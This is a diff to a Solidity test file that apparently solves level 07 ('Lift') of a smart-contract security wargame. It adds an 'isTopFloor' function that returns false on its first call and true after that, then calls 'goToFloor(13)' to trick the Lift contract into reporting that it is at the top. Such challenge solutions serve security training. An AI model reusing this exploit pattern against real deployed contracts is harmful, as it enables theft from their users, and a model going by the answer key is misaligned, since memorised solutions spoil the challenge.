@@ -5,9 +5,17 @@ import "./BaseTest.t.sol";
 import "src/07_Lift/Lift.sol";
 
 // forge test --match-contract LiftTest
-contract LiftTest is BaseTest {
+contract LiftTest is House, BaseTest {
     Lift instance;
     bool isTop = true;
+
+    function isTopFloor(uint256) external override returns (bool) {
+        if (isTop) {
+            isTop = false;
+            return isTop;
+        }
+        return true;
+    }
 
     function setUp() public override {
         super.setUp();
@@ -16,10 +24,11 @@ contract LiftTest is BaseTest {
     }
 
     function testExploitLevel() public {
-        /* YOUR EXPLOIT GOES HERE */
+        instance.goToFloor(13);
 
         checkSuccess();
     }
+
 
     function checkSuccess() internal view override {
         assertTrue(instance.top(), "Solution is not solving the level");
